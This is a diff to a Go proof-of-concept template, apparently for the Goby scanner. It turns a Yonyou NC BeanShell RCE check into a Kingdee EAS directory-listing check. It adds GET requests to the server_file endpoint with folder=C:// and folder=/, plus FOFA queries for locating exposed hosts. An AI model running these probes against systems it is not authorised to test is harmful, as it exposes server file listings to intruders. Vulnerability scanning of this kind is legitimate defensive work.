@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "金蝶OA server_file 目录遍历漏洞",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Kingdee-EAS\" || product=\"Kingdee-EAS\"",
+  "GobyQuery": "app=\"Kingdee-EAS\" || product=\"Kingdee-EAS\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -26,11 +26,11 @@ func init() {
     "Content": ""
   },
   "ScanSteps": [
-    "AND",
+    "OR",
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "appmonitor/protected/selector/server_file/files?folder=C://&suffix=",
         "follow_redirect": true,
         "header": {},
         "data_type": "text",
@@ -51,7 +51,38 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "Program Files",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    },
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "appmonitor/protected/selector/server_file/files?folder=/&suffix=",
+        "follow_redirect": true,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "/home",
             "bz": ""
           }
         ]
@@ -107,7 +138,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "金蝶OA server_file 目录遍历漏洞",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +147,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Kingdee-EAS dir list",
       "Product": "",
       "Description": "",
       "Recommendation": "",
